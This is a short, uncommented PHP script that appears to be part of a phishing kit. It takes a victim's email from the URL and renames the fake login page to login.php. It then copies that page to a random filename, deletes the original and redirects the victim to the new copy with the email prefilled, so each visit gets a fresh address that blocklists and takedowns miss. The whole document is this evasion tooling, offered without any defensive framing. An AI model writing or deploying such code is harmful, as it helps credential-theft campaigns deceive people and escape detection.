<?php
session_start();
$login = ($_GET['Email']) ? $_GET['Email'] : $_GET['email'];
$v = $_GET['v'];
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 	$len = strlen($entry);
		if($len == 30){
			rename($entry, "login.php");
		}
	}
}

$staticfile = "login.php";
$name =  generateRandomString();
$secfile = $name.".php";

if (copy($staticfile, $secfile)) {
	if(file_exists($secfile)){
		unlink($staticfile);
		header("Location: $secfile?Email=$login&v=$v");
	}
}

function generateRandomString($length = 26) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>
